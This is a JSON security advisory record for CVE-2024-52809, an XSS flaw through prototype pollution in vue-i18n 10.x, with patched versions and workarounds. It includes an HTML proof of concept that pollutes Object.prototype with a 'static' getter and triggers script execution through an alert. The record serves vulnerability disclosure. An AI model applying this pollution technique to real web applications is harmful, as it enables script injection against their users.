{
  "Severity": "MODERATE",
  "UpdatedAt": "2024-12-02T17:26:22Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "petite-vue-i18n"
  },
  "Advisory": {
    "DatabaseId": 270278,
    "Id": "GSA_kwCzR0hTQS05cjltLWZmcDYtOXg0ds4ABB_G",
    "GhsaId": "GHSA-9r9m-ffp6-9x4v",
    "References": [
      {
        "Url": "https://github.com/intlify/vue-i18n/security/advisories/GHSA-9r9m-ffp6-9x4v"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-52809"
      },
      {
        "Url": "https://github.com/intlify/vue-i18n/commit/72f0d323006fc7363b18cab62d4522dadd874411"
      },
      {
        "Url": "https://github.com/intlify/vue-i18n/commit/9f20909ef8c9232a1072d7818e12ed6d6451024d"
      },
      {
        "Url": "https://github.com/advisories/GHSA-9r9m-ffp6-9x4v"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-9r9m-ffp6-9x4v"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-52809"
      }
    ],
    "Description": "### Vulnerability type\nXSS\n\n### Description\nvue-i18n can be passed locale messages to `createI18n` or `useI18n`.\nwe can then translate them using `t` and `$t`.\nvue-i18n has its own syntax for local messages, and uses a message compiler to generate AST.\nIn order to maximize the performance of the translation function, vue-i18n uses bundler plugins such as `@intlify/unplugin-vue-i18n` and bulder to convert the AST in advance when building the application.\nBy using that AST as the locale message, it is no longer necessary to compile, and it is possible to translate using the AST.\n\nThe AST generated by the message compiler has special properties for each node in the AST tree to maximize performance. In the PoC example below, it is a `static` property, but that is just one of the optimizations.\nAbout details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts\n\nIn general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,\nso there is always a property that is attached during optimization like this time.\nBut if you are using a locale message AST in development mode or your own, there is a possibility of XSS if a third party injects.\n\n### Reproduce (PoC)\n```html\n\u003c!doctype html\u003e\n\u003chtml\u003e\n  \u003chead\u003e\n    \u003cmeta charset=\"utf-8\" /\u003e\n    \u003ctitle\u003evue-i18n XSS\u003c/title\u003e\n    \u003cscript src=\"https://unpkg.com/vue@3\"\u003e\u003c/script\u003e\n    \u003cscript src=\"https://unpkg.com/vue-i18n@10\"\u003e\u003c/script\u003e\n    \u003c!-- Scripts that perform prototype contamination, such as being distributed from malicious hosting sites or injected through supply chain attacks, etc. --\u003e\n    \u003cscript\u003e\n      /**\n       * Prototype pollution vulnerability with `Object.prototype`.\n       * The 'static' property is part of the optimized AST generated by the vue-i18n message compiler.\n       * About details of special properties, see https://github.com/intlify/vue-i18n/blob/master/packages/message-compiler/src/nodes.ts\n       *\n       * In general, the locale messages of vue-i18n are optimized during production builds using `@intlify/unplugin-vue-i18n`,\n       * so there is always a property that is attached during optimization like this time.\n       * But if you are using a locale message AST in development or your own, there is a possibility of XSS if a third party injects prototype pollution code.\n       */\n      Object.defineProperty(Object.prototype, 'static', {\n        configurable: true,\n        get() {\n          alert('prototype polluted!')\n          return 'prototype pollution'\n        }\n      })\n    \u003c/script\u003e \n \u003c/head\u003e\n  \u003cbody\u003e\n    \u003cdiv id=\"app\"\u003e\n      \u003cp\u003e{{ t('hello') }}\u003c/p\u003e\n    \u003c/div\u003e\n    \u003cscript\u003e\n      const { createApp } = Vue\n      const { createI18n, useI18n } = VueI18n\n\n      // AST style locale message, which build by `@intlify/unplugin-vue-i18n`\n      const en = {\n        hello: {\n          type: 0,\n          body: {\n            items: [\n              {\n                type: 3,\n                value: 'hello world!'\n              }\n            ]\n          }\n        }\n      }\n\n      const i18n = createI18n({\n        legacy: false,\n        locale: 'en',\n        messages: {\n          en\n        }\n      })\n\n      const app = createApp({\n        setup() {\n          const { t } = useI18n()\n          return { t }\n        }\n      })\n      app.use(i18n)\n      app.mount('#app')\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n### Workarounds\nBefore v10.0.0, we can work around this vulnerability by using the regular compilation (`jit: false` of `@intlify/unplugin-vue-i18n` plugin configuration) way instead of jit compilation.\n- jit compilation: https://vue-i18n.intlify.dev/guide/advanced/optimization.html#jit-compilation\n- bundler plugin option: https://github.com/intlify/bundle-tools/tree/main/packages/unplugin-vue-i18n#jitcompilation\n\n### References\n- [Simillar case: Vue 2 XSS vulnerability with prototype pollution](https://www.herodevs.com/vulnerability-directory/cve-2024-6783)\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-12-02T17:26:20Z",
    "Severity": "MODERATE",
    "Summary": "vue-i18n has cross-site scripting vulnerability with prototype pollution",
    "UpdatedAt": "2024-12-02T17:26:22Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 0,
      "VectorString": ""
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "10.0.5"
      },
      "VulnerableVersionRange": "\u003e= 10.0.0, \u003c 10.0.5"
    }
  ]
}